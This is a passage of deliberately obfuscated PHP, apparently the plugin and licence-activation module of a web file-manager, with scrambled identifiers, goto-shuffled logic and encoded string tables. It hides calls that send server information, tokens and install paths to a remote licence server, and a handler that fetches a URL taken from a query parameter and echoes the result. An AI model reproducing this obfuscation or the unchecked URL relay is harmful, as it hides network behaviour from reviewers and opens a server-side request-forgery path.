$_SERVER[$AàÜ¼®¼Íâ] = $_SERVER[$fò›¹ç]; $_SERVER[strtoupper($AàÜ¼®¼Íâ)] = $_SERVER[$fò›¹ç]; } } public static function get($böµ±—«Œ) { self::init(); return $_SERVER[$böµ±—«Œ] ? $_SERVER[$böµ±—«Œ] : $_SERVER[$_SERVER[°Óó£ÌİóèÅ][1257] . strtoupper($böµ±—«Œ)]; } public static function method() { return strtoupper(self::get($_SERVER[°Óó£ÌİóèÅ][157])); } public static function length() { $BÖ¼¨Ö÷ø× =& $_SERVER[°Óó£ÌİóèÅ]; $bŠ³Œ´ÁÎ = self::get($BÖ¼¨Ö÷ø×[1258]); if (!$bŠ³Œ´ÁÎ) { $bŠ³Œ´ÁÎ = self::get($BÖ¼¨Ö÷ø×[879]); } return $bŠ³Œ´ÁÎ; } public static function range() { $AÀ«Î•È‰ =& $_SERVER[°Óó£ÌİóèÅ]; $f·éßåäŠœ = self::get($AÀ«Î•È‰[206]); if (!$f·éßåäŠœ) { return !1; } if (!preg_match($AÀ«Î•È‰[1259], $f·éßåäŠœ, $a‰¨´Õ½«¿)) { return !1; } if ($a‰¨´Õ½«¿[1] === $AÀ«Î•È‰[33] && $a‰¨´Õ½«¿[2] === $AÀ«Î•È‰[33]) { return !1; } return array($a‰¨´Õ½«¿[1] !== $AÀ«Î•È‰[33] ? $a‰¨´Õ½«¿[1] : null, $a‰¨´Õ½«¿[2] !== $AÀ«Î•È‰[33] ? $a‰¨´Õ½«¿[2] : null); } public static $statusCode = array("\61\x30\x30" => "\103\157\x6e\164\x69\156\x75\145", "\x31\x30\x31" => "\x53\167\x69\164\143\x68\x69\x6e\x67\40\x50\162\157\x74\x6f\143\157\154", "\x31\x30\x32" => "\x50\162\157\143\145\x73\x73\151\x6e\x67", "\x31\x30\63" => "\x45\x61\162\x6c\x79\x20\110\151\x6e\x74\x73", "\x32\60\x30" => "\x4f\x4b", "\x32\x30\x31" => "\x43\162\145\x61\x74\x65\x64", "\62\x30\x32" => "\101\x63\x63\x65\160\164\x65\x64", "\x32\x30\63" => "\x4e\x6f\x6e\55\101\165\x74\150\157\x72\151\x74\x61\x74\x69\166\x65\40\111\x6e\146\x6f\x72\x6d\x61\x74\151\x6f\156", "\62\60\64" => "\116\157\40\x43\x6f\x6e\164\x65\x6e\x74", "\x32\60\65" => "\122\x65\x73\x65\164\x20\x43\x6f\x6e\x74\x65\x6e\164", "\62\60\66" => "\x50\x61\x72\164\151\141\x6c\x20\103\x6f\x6e\164\145\156\x74", "\x32\60\67" => "\115\165\x6c\164\x69\x2d\x53\x74\141\164\165\163", "\x33\60\60" => "\x4d\x75\x6c\164\151\x70\154\145\40\103\x68\157\x69\143\x65\163", "\x33\x30\61" => "\115\157\166\145\x64\x20\x50\x65\x72\155\x61\x6e\145\156\164\154\171", "\x33\60\x32" => "\106\157\165\156\144", "\63\60\x33" => "\x53\145\145\40\x4f\164\x68\x65\162", "\x33\60\64" => "\x4e\157\x74\x20\115\x6f\144\x69\x66\151\x65\x64", "\63\x30\65" => "\x55\163\x65\40\x50\162\x6f\x78\x79", "\63\x30\67" => "\124\x65\155\x70\157\162\141\162\171\40\x52\145\x64\x69\162\145\143\164", "\x33\60\70" => "\120\145\x72\x6d\x61\x6e\145\x6e\x74\x20\122\145\x64\x69\162\x65\x63\164", "\64\x30\x30" => "\102\x61\144\x20\x52\x65\161\165\x65\163\x74", "\64\60\61" => "\x55\156\141\165\x74\150\x6f\x72\151\172\145\x64", "\x34\x30\62" => "\x50\141\x79\x6d\145\156\x74\x20\x52\x65\161\165\151\x72\x65\x64", "\64\60\63" => "\106\x6f\162\x62\x69\144\144\145\x6e", "\x34\x30\64" => "\x4e\157\x74\40\x46\157\165\x6e\144", "\x34\60\65" => "\x4d\145\164\150\157\x64\40\x4e\x6f\x74\40\x41\154\154\x6f\167\145\144", "\x34\60\66" => "\116\x6f\164\x20\101\x63\x63\x65\x70\164\x61\142\x6c\x65", "\64\60\x37" => "\x50\162\x6f\170\x79\40\x41\165\x74\150\145\156\164\151\143\x61\x74\x69\x6f\x6e\40\x52\x65\161\165\151\x72\145\x64", "\x34\x30\70" => "\122\x65\161\165\x65\163\164\x20\124\x69\x6d\145\157\x75\x74", "\64\x30\x39" => "\x43\x6f\x6e\x66\154\151\x63\x74", "\x34\61\60" => "\107\x6f\156\x65", "\x34\61\x31" => "\x4c\145\156\147\x74\x68\40\x52\145\161\x75\151\162\x65\x64", "\64\61\x32" => "\x50\162\145\143\x6f\156\144\x69\164\151\157\156\40\106\x61\151\154\145\x64", "\64\x31\63" => "\122\145\x71\x75\145\x73\164\x20\x45\x6e\164\x69\x74\171\x20\124\157\x6f\x20\114\x61\x72\x67\145", "\x34\x31\x34" => "\x52\145\161\x75\x65\x73\164\40\125\x52\x49\40\124\157\157\x20\114\141\x72\147\145", "\x34\x31\65" => "\125\x6e\163\165\160\x70\x6f\162\164\x65\144\x20\115\145\144\x69\141\40\x54\171\160\145", "\x34\x31\x36" => "\x52\145\x71\x75\x65\x73\x74\145\x64\x20\x52\x61\156\x67\145\x20\116\157\x74\x20\123\141\164\x69\163\146\x69\x61\142\154\145", "\64\x31\x37" => "\105\170\x70\x65\x63\x74\141\x74\x69\x6f\156\x20\106\141\151\154\x65\144", "\x34\x32\62" => "\125\156\160\x72\157\x63\145\x73\163\x61\142\x6c\145\x20\x45\156\164\x69\x74\x79", "\64\x32\63" => "\x4c\x6f\143\x6b\145\x64", "\64\62\64" => "\106\x61\x69\x6c\145\x64\40\104\x65\160\x65\156\x64\x65\x6e\143\x79", "\x34\62\65" => "\125\x6e\157\162\x64\145\x72\145\144\x20\x43\157\x6c\154\x65\x63\x74\x69\x6f\156", "\64\x32\66" => "\x55\160\x67\162\x61\144\145\x20\x52\145\161\x75\151\x72\145\144", "\x34\x32\x38" => "\x50\162\x65\x63\x6f\156\144\x69\164\151\x6f\x6e\x20\x52\x65\x71\x75\x69\162\145\x64", "\64\x32\x39" => "\x54\157\157\40\x4d\x61\156\171\40\122\x65\161\x75\x65\x73\x74\163", "\x34\63\x31" => "\122\145\x71\165\145\x73\x74\x20\110\145\141\144\145\162\x20\x46\x69\x65\154\x64\x73\x20\124\157\157\x20\x4c\x61\x72\x67\145", "\64\x34\x34" => "\x4e\157\40\x52\x65\163\160\x6f\156\163\x65", "\x34\65\60" => "\102\x6c\x6f\x63\x6b\x65\144\x20\142\171\x20\x57\151\x6e\x64\x6f\167\x73\40\x50\141\162\x65\x6e\164\141\x6c\40\x43\157\156\164\162\x6f\x6c\163", "\64\65\x31" => "\125\x6e\141\x76\141\x69\x6c\x61\x62\x6c\x65\40\106\157\162\x20\x4c\145\x67\141\x6c\40\x52\145\141\163\157\156\x73", "\64\71\64" => "\x52\x65\161\165\145\163\164\x20\110\x65\x61\144\x65\x72\40\124\x6f\157\40\x4c\x61\162\x67\145", "\65\60\x30" => "\111\156\164\x65\x72\x6e\x61\x6c\x20\123\145\162\166\145\162\x20\x45\162\x72\157\162", "\x35\x30\61" => "\116\157\x74\x20\111\x6d\x70\154\x65\155\145\156\x74\145\x64", "\65\60\62" => "\x42\x61\x64\x20\x47\x61\164\x65\x77\x61\171", "\x35\x30\x33" => "\123\145\x72\166\x69\x63\x65\40\125\x6e\x61\166\141\151\x6c\x61\x62\154\x65", "\x35\60\x34" => "\107\141\x74\x65\167\x61\x79\40\x54\151\155\145\157\165\x74", "\65\60\x35" => "\x48\124\124\x50\40\126\x65\162\x73\151\157\x6e\x20\x6e\x6f\x74\40\163\165\160\160\x6f\162\164\x65\144", "\65\60\67" => "\x49\x6e\x73\165\146\146\x69\x63\x69\x65\156\x74\x20\x53\164\157\x72\141\147\x65"); public static function code($dÌÜ®ßñœ°) { $f»ø»¬Ú¾ö =& $_SERVER[°Óó£ÌİóèÅ]; $dÌÜ®ßñœ° = $dÌÜ®ßñœ° . $f»ø»¬Ú¾ö[33]; $cÏ’Ï™¦Õ² = self::$statusCode[$dÌÜ®ßñœ°]; $cÏ’Ï™¦Õ² = $cÏ’Ï™¦Õ² ? "\x48\124\x54\x50\x2f\61\x2e\x31\40{$dÌÜ®ßñœ°}\x20" . $cÏ’Ï™¦Õ² : $f»ø»¬Ú¾ö[33]; return $cÏ’Ï™¦Õ²; } } goto f”™ëº‚Ó; A¯òô³Ç¿ø: define($_SERVER[°Óó£ÌİóèÅ][0], $_SERVER[°Óó£ÌİóèÅ][1]); $_SERVER[³ªí] = explode($_SERVER[°Óó£ÌİóèÅ][2], gzinflate(substr($_SERVER[°Óó£ÌİóèÅ][3], 10, -8))); function Model($aµÆÍÇ±Ê = '', $D¿ÆâÙ©£Ã = '', $A¬‹Œ«¡…¦ = '') { goto d®ô•À Ï; CÑëä‚«æ¡: return $BéÍè¡ø¢[$AÙ‡éßÍœ¤]; goto eíã —Ø×„; aõÀÍ„ïŠ: if (isset($BéÍè¡ø¢[$AÙ‡éßÍœ¤])) { return $BéÍè¡ø¢[$AÙ‡éßÍœ¤]; } if ($aµÆÍÇ±Ê) { $aµÆÍÇ±Ê = strtoupper($aµÆÍÇ±Ê[0]) . substr($aµÆÍÇ±Ê, 1); $F‹Ö¹Ãù¼Š = $aµÆÍÇ±Ê . $EîÑ¿£ŸÕ[1]; if (class_exists($F‹Ö¹Ãù¼Š)) { $BéÍè¡ø¢[$AÙ‡éßÍœ¤] = new $F‹Ö¹Ãù¼Š(); return $BéÍè¡ø¢[$AÙ‡éßÍœ¤]; } } $BéÍè¡ø¢[$AÙ‡éßÍœ¤] = new ModelBase($aµÆÍÇ±Ê, $D¿ÆâÙ©£Ã, $A¬‹Œ«¡…¦); goto CÑëä‚«æ¡; d®ô•À Ï: $EîÑ¿£ŸÕ =& $_SERVER[³ªí]; static $BéÍè¡ø¢ = array(); $AÙ‡éßÍœ¤ = strtolower($D¿ÆâÙ©£Ã . $EîÑ¿£ŸÕ[0] . $aµÆÍÇ±Ê); goto aõÀÍ„ïŠ; eíã —Ø×„: } goto aĞÕ¡³; f÷˜°ËŸ: $_SERVER[§¦€¦ÊòÓ] = explode($_SERVER[°Óó£ÌİóèÅ][1651], gzinflate(substr($_SERVER[°Óó£ÌİóèÅ][1652], 10, -8))); class PluginModel extends ModelBaseLight { public $optionType = "\123\171\x73\164\145\x6d\56\x70\154\x75\x67\151\156\114\x69\x73\164"; public $field = array("\156\141\155\x65", "\163\x74\x61\164\x75\163", "\x72\145\147\151\145\163\164", "\x63\x6f\156\146\151\x67"); private $versionData = array(); private $version = "\101"; public function loadList($aÜ’ª¯„±™ = false) { $cÜƒóù‡¡ˆ = array_to_keyvalue($this->listData(), $_SERVER[§¦€¦ÊòÓ][0]); if ($aÜ’ª¯„±™) { return $cÜƒóù‡¡ˆ[$aÜ’ª¯„±™]; } return $cÜƒóù‡¡ˆ; } public function init() { goto Aœ¬ç™±«Ã; a×ÒÀá ½’: if (isset($_GET[$cáÆ°ÑÆäˆ[5]]) && in_array(strtolower(ACTION), $dæ ğŒ¤í)) { $F£æÈƒêÌµ = hash_decode($_GET[$cáÆ°ÑÆäˆ[5]]); header($cáÆ°ÑÆäˆ[6]); if (isset($GLOBALS[$cáÆ°ÑÆäˆ[7]]) && $GLOBALS[$cáÆ°ÑÆäˆ[7]] && $F£æÈƒêÌµ && substr($F£æÈƒêÌµ, 0, 4) == $cáÆ°ÑÆäˆ[8]) { $F£æÈƒêÌµ = str_replace($cáÆ°ÑÆäˆ[9], $cáÆ°ÑÆäˆ[10], $F£æÈƒêÌµ); $cÁ¶âéÑãù = url_request($F£æÈƒêÌµ, $cáÆ°ÑÆäˆ[11], !1, !1, !1, !1, 2); if ($cÁ¶âéÑãù[$cáÆ°ÑÆäˆ[12]] && strstr($cÁ¶âéÑãù[$cáÆ°ÑÆäˆ[12]], $cáÆ°ÑÆäˆ[13])) { echo $cÁ¶âéÑãù[$cáÆ°ÑÆäˆ[12]]; } } die; } $this->checkDataInit(); $this->checkVersion(); goto BñåÒÇ”»Ş; Aœ¬ç™±«Ã: $cáÆ°ÑÆäˆ =& $_SERVER[§¦€¦ÊòÓ]; $C‡“ŠÃ×¦ = $this->loadList(); $this->dataCheck(); goto a¯õñ¼„ñ†; BÏ—…‡Œ: Hook::trigger($cáÆ°ÑÆäˆ[2]); Hook::trigger(ACTION); $dæ ğŒ¤í = array($cáÆ°ÑÆäˆ[3], $cáÆ°ÑÆäˆ[4]); goto a×ÒÀá ½’; d±”‚´ÁÆ®: Hook::bind($cáÆ°ÑÆäˆ[16], $cáÆ°ÑÆäˆ[17]); goto eÑ­¥Äò‘ï; a¯õñ¼„ñ†: $this->dataAllow(); $C‡“ŠÃ×¦ = $this->checkPlugin($C‡“ŠÃ×¦); foreach ($C‡“ŠÃ×¦ as $D‰İ°ÌÑˆĞ => $FÙØ ˜ïç) { $d‰Ôİ˜ïø = $this->appAllow($D‰İ°ÌÑˆĞ, $FÙØ ˜ïç); if (!$d‰Ôİ˜ïø) { continue; } foreach ($FÙØ ˜ïç[$cáÆ°ÑÆäˆ[1]] as $FÊ—»ÍÁ¸× => $c——‚¸¢ö) { Hook::bind($FÊ—»ÍÁ¸×, $c——‚¸¢ö); } } goto BÏ—…‡Œ; BñåÒÇ”»Ş: $this->assignCopyright(); $this->disableCheck(); Hook::bind($cáÆ°ÑÆäˆ[14], $cáÆ°ÑÆäˆ[15]); goto d±”‚´ÁÆ®; eÑ­¥Äò‘ï: } public function optionsFilter($fÏï¦Ç›®) { goto CğŸç–Šá; f¸îœŞÁ²ƒ: $fÏï¦Ç›®[$Eˆƒ‰ï¹…†[58]][$Eˆƒ‰ï¹…†[63]] = base64_encode(serverInfo()); $fÏï¦Ç›®[$Eˆƒ‰ï¹…†[58]][$Eˆƒ‰ï¹…†[64]] = $this->version; if ($BòÀÔÆ¡[$Eˆƒ‰ï¹…†[64]] != $Eˆƒ‰ï¹…†[65]) { $fÏï¦Ç›®[$Eˆƒ‰ï¹…†[58]][$Eˆƒ‰ï¹…†[66]] = $BòÀÔÆ¡[$Eˆƒ‰ï¹…†[66]]; $fÏï¦Ç›®[$Eˆƒ‰ï¹…†[58]][$Eˆƒ‰ï¹…†[67]] = $BòÀÔÆ¡[$Eˆƒ‰ï¹…†[67]]; $EëÖ‡å²ª½ = rand_string(10) . $this->version . rand_string(5); $fÏï¦Ç›®[$Eˆƒ‰ï¹…†[45]][$Eˆƒ‰ï¹…†[68]][$Eˆƒ‰ï¹…†[69]] = $this->encode($EëÖ‡å²ª½, $fÏï¦Ç›®[$Eˆƒ‰ï¹…†[58]][$Eˆƒ‰ï¹…†[61]]); } goto eö×ªå; cİĞ©“Øµå: $fÏï¦Ç›®[$Eˆƒ‰ï¹…†[45]][$Eˆƒ‰ï¹…†[46]][$Eˆƒ‰ï¹…†[51]] = array($Eˆƒ‰ï¹…†[52] => (int) $Bâ±ÖÙ…öÓ[$Eˆƒ‰ï¹…†[53]], $Eˆƒ‰ï¹…†[54] => array_filter(_get($Bâ±ÖÙ…öÓ, $Eˆƒ‰ï¹…†[55], array())), $Eˆƒ‰ï¹…†[56] => (int) _get($Bâ±ÖÙ…öÓ, $Eˆƒ‰ï¹…†[57], 0)); $fÏï¦Ç›®[$Eˆƒ‰ï¹…†[58]][$Eˆƒ‰ï¹…†[59]] = Action($Eˆƒ‰ï¹…†[60])->accessToken(); $fÏï¦Ç›®[$Eˆƒ‰ï¹…†[58]][$Eˆƒ‰ï¹…†[61]] = md5(BASIC_PATH . $BòÀÔÆ¡[$Eˆƒ‰ï¹…†[62]]); goto f¸îœŞÁ²ƒ; eö×ªå: if ($this->version == $Eˆƒ‰ï¹…†[65]) { $fÏï¦Ç›®[$Eˆƒ‰ï¹…†[45]][$Eˆƒ‰ï¹…†[46]][$Eˆƒ‰ï¹…†[51]][$Eˆƒ‰ï¹…†[57]] = 0; } $fÏï¦Ç›®[$Eˆƒ‰ï¹…†[58]][$Eˆƒ‰ï¹…†[70]] = _get($this->versionData, $Eˆƒ‰ï¹…†[71], $Eˆƒ‰ï¹…†[72]); $fÏï¦Ç›®[$Eˆƒ‰ï¹…†[58]][$Eˆƒ‰ï¹…†[73]] = _get($this->versionData, $Eˆƒ‰ï¹…†[74], $Eˆƒ‰ï¹…†[72]); goto A®ÑŞ‡òé; A®ÑŞ‡òé: if ($GLOBALS[$Eˆƒ‰ï¹…†[7]] && $this->config[$Eˆƒ‰ï¹…†[75]]) { $fÏï¦Ç›®[$Eˆƒ‰ï¹…†[58]][$Eˆƒ‰ï¹…†[76]] = WEB_ROOT; } return $fÏï¦Ç›®; goto D“¾Û²Ôì‚; C–™ç¹àã‚: unset($fÏï¦Ç›®[$Eˆƒ‰ï¹…†[45]][$Eˆƒ‰ï¹…†[47]][$Eˆƒ‰ï¹…†[49]]); unset($fÏï¦Ç›®[$Eˆƒ‰ï¹…†[45]][$Eˆƒ‰ï¹…†[46]][$Eˆƒ‰ï¹…†[31]]); unset($fÏï¦Ç›®[$Eˆƒ‰ï¹…†[45]][$Eˆƒ‰ï¹…†[46]][$Eˆƒ‰ï¹…†[50]]); goto cİĞ©“Øµå; CğŸç–Šá: $Eˆƒ‰ï¹…† =& $_SERVER[§¦€¦ÊòÓ]; $BòÀÔÆ¡ = Model($Eˆƒ‰ï¹…†[18])->get(); $A¤÷²…‹¦ = array($Eˆƒ‰ï¹…†[19], $Eˆƒ‰ï¹…†[20], $Eˆƒ‰ï¹…†[21], $Eˆƒ‰ï¹…†[22], $Eˆƒ‰ï¹…†[23], $Eˆƒ‰ï¹…†[24], $Eˆƒ‰ï¹…†[25], $Eˆƒ‰ï¹…†[26], $Eˆƒ‰ï¹…†[27], $Eˆƒ‰ï¹…†[28], $Eˆƒ‰ï¹…†[29], $Eˆƒ‰ï¹…†[30], $Eˆƒ‰ï¹…†[31], $Eˆƒ‰ï¹…†[32], $Eˆƒ‰ï¹…†[33], $Eˆƒ‰ï¹…†[34], $Eˆƒ‰ï¹…†[35], $Eˆƒ‰ï¹…†[36], $Eˆƒ‰ï¹…†[37], $Eˆƒ‰ï¹…†[38], $Eˆƒ‰ï¹…†[39], $Eˆƒ‰ï¹…†[40], $Eˆƒ‰ï¹…†[41], $Eˆƒ‰ï¹…†[42]); goto BŞš¦Ë–Š; BŞš¦Ë–Š: foreach ($A¤÷²…‹¦ as $cŠ¦®İá˜ê) { $aÒïßè›Ìˆ = $GLOBALS[$Eˆƒ‰ï¹…†[43]][$Eˆƒ‰ï¹…†[44]][$cŠ¦®İá˜ê]; if (isset($BòÀÔÆ¡[$cŠ¦®İá˜ê])) { $aÒïßè›Ìˆ = $BòÀÔÆ¡[$cŠ¦®İá˜ê]; } $fÏï¦Ç›®[$Eˆƒ‰ï¹…†[45]][$Eˆƒ‰ï¹…†[46]][$cŠ¦®İá˜ê] = $aÒïßè›Ìˆ; } $Bâ±ÖÙ…öÓ = $fÏï¦Ç›®[$Eˆƒ‰ï¹…†[45]][$Eˆƒ‰ï¹…†[46]][$Eˆƒ‰ï¹…†[31]]; unset($fÏï¦Ç›®[$Eˆƒ‰ï¹…†[45]][$Eˆƒ‰ï¹…†[47]][$Eˆƒ‰ï¹…†[48]]); goto C–™ç¹àã‚; D“¾Û²Ôì‚: } private function assignCopyright() { goto A¶ÌÌ¦ËÍ; BÄ÷ÃŒ¬÷õ: foreach ($CæàØ¯Å­ as $bŒêá†Ë‚ï) { if (!isset($bËèøÇ¢º [$bŒêá†Ë‚ï]) || !$bËèøÇ¢º [$bŒêá†Ë‚ï]) { continue; } $B½“ÆŒß¤Ğ[$bŒêá†Ë‚ï] = $bËèøÇ¢º [$bŒêá†Ë‚ï]; } I18n::set($B½“ÆŒß¤Ğ); goto B·«ô§‘Ê¦; A¶ÌÌ¦ËÍ: $CÚ©äñåº¸ =& $_SERVER[§¦€¦ÊòÓ]; if (ACTION == $CÚ©äñåº¸[3]) { $d¸Ù¥ø¨·é = array($CÚ©äñåº¸[64] => $this->version, $CÚ©äñåº¸[77] => $this->userCount(), $CÚ©äñåº¸[78] => Model($CÚ©äñåº¸[79])->count()); if ($this->version != $CÚ©äñåº¸[65]) { $eŠ…áÍ°¿í = _get($this->versionData, $CÚ©äñåº¸[80]); if ($eŠ…áÍ°¿í) { $d¸Ù¥ø¨·é[$CÚ©äñåº¸[81]] = $eŠ…áÍ°¿í; $d¸Ù¥ø¨·é[$CÚ©äñåº¸[82]] = strtotime(_get($this->versionData, $CÚ©äñåº¸[83])); $d¸Ù¥ø¨·é[$CÚ©äñåº¸[84]] = _get($this->versionData, $CÚ©äñåº¸[74]); } } $d¸Ù¥ø¨·é = Mcrypt::encode(json_encode($d¸Ù¥ø¨·é), md5($CÚ©äñåº¸[85])); I18n::set(array($CÚ©äñåº¸[86] => $d¸Ù¥ø¨·é)); } if ($this->version == $CÚ©äñåº¸[65]) { return; } goto b¶¥ÂŠÎìŒ; b¶¥ÂŠÎìŒ: $CæàØ¯Å­ = array($CÚ©äñåº¸[87], $CÚ©äñåº¸[88], $CÚ©äñåº¸[89], $CÚ©äñåº¸[90], $CÚ©äñåº¸[91], $CÚ©äñåº¸[92]); $bËèøÇ¢º  = Model($CÚ©äñåº¸[18])->get(); $B½“ÆŒß¤Ğ = array($CÚ©äñåº¸[93] => $bËèøÇ¢º [$CÚ©äñåº¸[19]], $CÚ©äñåº¸[94] => $bËèøÇ¢º [$CÚ©äñåº¸[20]], $CÚ©äñåº¸[95] => $CÚ©äñåº¸[72]); goto BÄ÷ÃŒ¬÷õ; B·«ô§‘Ê¦: } private function checkDataInit() { goto C·ò‚È§Ó; C•›¦ÅÜ¥Ú: $CØ°ÏâáŸÄ = $this->encode(json_encode($fßğÈÑ¹‡À), $dóêğµŞø¤); $a”–´Ûô› = $this->loadList(); $cÚ„”…¬ = $a”–´Ûô›[$fÃ¦Âæ‡£[132]]; goto d¾Ôß·Ş„; fØÒ™ ğ¦…: if (isset($cãÙ öÒ Ã[$fÃ¦Âæ‡£[98]])) { $this->dataReset(); die; } if (!isset($cãÙ öÒ Ã[$fÃ¦Âæ‡£[99]]) || strlen($cãÙ öÒ Ã[$fÃ¦Âæ‡£[99]]) != 16) { show_json($fÃ¦Âæ‡£[100] . $cãÙ öÒ Ã[$fÃ¦Âæ‡£[99]], !1); } $D›…ø¿ÔùÄ = Model($fÃ¦Âæ‡£[18])->get($fÃ¦Âæ‡£[62]); goto bĞá°˜óÜÎ; c»Á‰ Ã³Ğ: $F•ê¢»äÜî = array($fÃ¦Âæ‡£[122] => $D¯²ëõÁìˆ[$fÃ¦Âæ‡£[99]], $fÃ¦Âæ‡£[123] => $fßğÈÑ¹‡À[$fÃ¦Âæ‡£[124]], $fÃ¦Âæ‡£[125] => rand_string(16), $fÃ¦Âæ‡£[64] => $fßğÈÑ¹‡À[$fÃ¦Âæ‡£[126]]); if ($D¯²ëõÁìˆ[$fÃ¦Âæ‡£[102]]) { $F•ê¢»äÜî[$fÃ¦Âæ‡£[125]] = $D¯²ëõÁìˆ[$fÃ¦Âæ‡£[102]]; } $A®„ôƒ»°„ = substr(md5($F•ê¢»äÜî[$fÃ¦Âæ‡£[123]]), 10, 10); goto BŸ¾‘–¦òÍ; CÇŠ¶„Áë: $this->update($cÚ„”…¬[$fÃ¦Âæ‡£[133]], array($fÃ¦Âæ‡£[134] => $f³ŠŞÜ¢Îæ)); show_json(LNG($fÃ¦Âæ‡£[135]), !0); goto DÆº¾ÛÑâ; BŸ¾‘–¦òÍ: $d¶¯™¤‘ñ = $A®„ôƒ»°„ . $F•ê¢»äÜî[$fÃ¦Âæ‡£[64]] . $F•ê¢»äÜî[$fÃ¦Âæ‡£[125]]; $F•ê¢»äÜî[$fÃ¦Âæ‡£[66]] = strrev(base64_encode(Mcrypt::encode($d¶¯™¤‘ñ, $fÃ¦Âæ‡£[127]))); $aº¯ÀÆØ‘† = rand_string(16); goto EÓ¹İ×–Ç§; EÓ¹İ×–Ç§: $B±‹‡Ú‘ší = $aº¯ÀÆØ‘† . $F•ê¢»äÜî[$fÃ¦Âæ‡£[64]] . Mcrypt::encode(md5($F•ê¢»äÜî[$fÃ¦Âæ‡£[122]]), $aº¯ÀÆØ‘†); $F•ê¢»äÜî[$fÃ¦Âæ‡£[67]] = base64_encode(strrev(Mcrypt::encode($B±‹‡Ú‘ší, $fÃ¦Âæ‡£[128]))); if ($fßğÈÑ¹‡À[$fÃ¦Âæ‡£[129]] && $fßğÈÑ¹‡À[$fÃ¦Âæ‡£[129]] >= 1) { Model($fÃ¦Âæ‡£[18])->setDeep($fÃ¦Âæ‡£[130], $fÃ¦Âæ‡£[131]); } goto Eµ˜„Îàâ; C·ò‚È§Ó: $fÃ¦Âæ‡£ =& $_SERVER[§¦€¦ÊòÓ]; if (ACTION != $fÃ¦Âæ‡£[96] || !$GLOBALS[$fÃ¦Âæ‡£[7]]) { return; } $cãÙ öÒ Ã = $GLOBALS[$fÃ¦Âæ‡£[97]]; goto fØÒ™ ğ¦…; bĞá°˜óÜÎ: $f×ÜËÅŒ² = Mcrypt::decode($fÃ¦Âæ‡£[101], $fÃ¦Âæ‡£[58]); $D¯²ëõÁìˆ = array($fÃ¦Âæ‡£[99] => $cãÙ öÒ Ã[$fÃ¦Âæ‡£[99]], $fÃ¦Âæ‡£[102] => rand_string(16), $fÃ¦Âæ‡£[103] => $fÃ¦Âæ‡£[85], $fÃ¦Âæ‡£[104] => KOD_VERSION, $fÃ¦Âæ‡£[105] => $_SERVER[$fÃ¦Âæ‡£[106]], $fÃ¦Âæ‡£[107] => INSTALL_CHANNEL); $FÛ£Ûšäõô = md5(BASIC_PATH . $D›…ø¿ÔùÄ); goto fù®‹ëãÚ¸; fù®‹ëãÚ¸: if ($cãÙ öÒ Ã[$fÃ¦Âæ‡£[108]] == $fÃ¦Âæ‡£[109]) { $Fó…ˆæËŒ = Mcrypt::encode($FÛ£Ûšäõô, $fÃ¦Âæ‡£[110]); $EŸêø–‚õè = json_encode($D¯²ëõÁìˆ); $EŸêø–‚õè = $this->encode($EŸêø–‚õè, $FÛ£Ûšäõô . $fÃ¦Âæ‡£[111], 3); $böÊáà¾‹Û = $f×ÜËÅŒ² . $fÃ¦Âæ‡£[112] . $Fó…ˆæËŒ . $fÃ¦Âæ‡£[113]; show_json($böÊáà¾‹Û . $EŸêø–‚õè, !0, $f×ÜËÅŒ²); } else { if ($cãÙ öÒ Ã[$fÃ¦Âæ‡£[108]] == $fÃ¦Âæ‡£[114]) { $fÙÕ†Œòõ = substr(md5($fÃ¦Âæ‡£[115], $FÛ£Ûšäõô), 12, 15) . $fÃ¦Âæ‡£[116]; $EŸêø–‚õè = $this->decode($cãÙ öÒ Ã[$fÃ¦Âæ‡£[117]], $fÙÕ†Œòõ, 2); $Bë“‹é‚Àà = json_decode($EŸêø–‚õè, !0); if (!is_array($Bë“‹é‚Àà) || !is_array($Bë“‹é‚Àà[$fÃ¦Âæ‡£[12]]) || $Bë“‹é‚Àà[$fÃ¦Âæ‡£[99]] != !0) { $fŠóÑ­á¾ = $fÃ¦Âæ‡£[118]; $A°«çê¢Ë¨ = $Bë“‹é‚Àà[$fÃ¦Âæ‡£[12]] ? $fÃ¦Âæ‡£[119] . $Bë“‹é‚Àà[$fÃ¦Âæ‡£[12]] : $fŠóÑ­á¾; show_json($A°«çê¢Ë¨, !1); } else { $D¯²ëõÁìˆ[$fÃ¦Âæ‡£[102]] = $Bë“‹é‚Àà[$fÃ¦Âæ‡£[12]][$fÃ¦Âæ‡£[120]]; } } else { $Bë“‹é‚Àà = url_request($f×ÜËÅŒ², $fÃ¦Âæ‡£[11], $D¯²ëõÁìˆ, !1, !1, !0, 10); $Bë“‹é‚Àà = $Bë“‹é‚Àà[$fÃ¦Âæ‡£[12]]; } } if (!is_array($Bë“‹é‚Àà) || !is_array($Bë“‹é‚Àà[$fÃ¦Âæ‡£[12]]) || $Bë“‹é‚Àà[$fÃ¦Âæ‡£[99]] != !0) { $fŠóÑ­á¾ = LNG($fÃ¦Âæ‡£[121]); $A°«çê¢Ë¨ = $Bë“‹é‚Àà[$fÃ¦Âæ‡£[12]] ? $fÃ¦Âæ‡£[119] . $Bë“‹é‚Àà[$fÃ¦Âæ‡£[12]] : $fŠóÑ­á¾; show_json($A°«çê¢Ë¨, !1); } $fßğÈÑ¹‡À = $Bë“‹é‚Àà[$fÃ¦Âæ‡£[12]]; goto c»Á‰ Ã³Ğ; Eµ˜„Îàâ: Model($fÃ¦Âæ‡£[18])->set($F•ê¢»äÜî); $dóêğµŞø¤ = md5(BASIC_PATH . strrev($D›…ø¿ÔùÄ) . $F•ê¢»äÜî[$fÃ¦Âæ‡£[123]]); $EÑ¬£ğåØ = strrev(substr($dóêğµŞø¤, 10, 16)); goto C•›¦ÅÜ¥Ú; d¾Ôß·Ş„: $f³ŠŞÜ¢Îæ = $cÚ„”…¬[$fÃ¦Âæ‡£[43]]; $f³ŠŞÜ¢Îæ = array(); $f³ŠŞÜ¢Îæ[$EÑ¬£ğåØ] = $CØ°ÏâáŸÄ; goto CÇŠ¶„Áë; DÆº¾ÛÑâ: } private function dataReset() { $C¶Öˆ ‹’å =& $_SERVER[§¦€¦ÊòÓ]; Model($C¶Öˆ ‹’å[18])->set(array($C¶Öˆ ‹’å[122] => $C¶Öˆ ‹’å[72], $C¶Öˆ ‹’å[123] => $C¶Öˆ ‹’å[72], $C¶Öˆ ‹’å[64] => $C¶Öˆ ‹’å[65], $C¶Öˆ ‹’å[66] => $C¶Öˆ ‹’å[72], $C¶Öˆ ‹’å[67] => $C¶Öˆ ‹’å[72])); Model($C¶Öˆ ‹’å[18])->setDeep($C¶Öˆ ‹’å[130], $C¶Öˆ ‹’å[136]); $this->versionData = array(); $this->version = $C¶Öˆ ‹’å[65]; } private function dataCheck() { goto 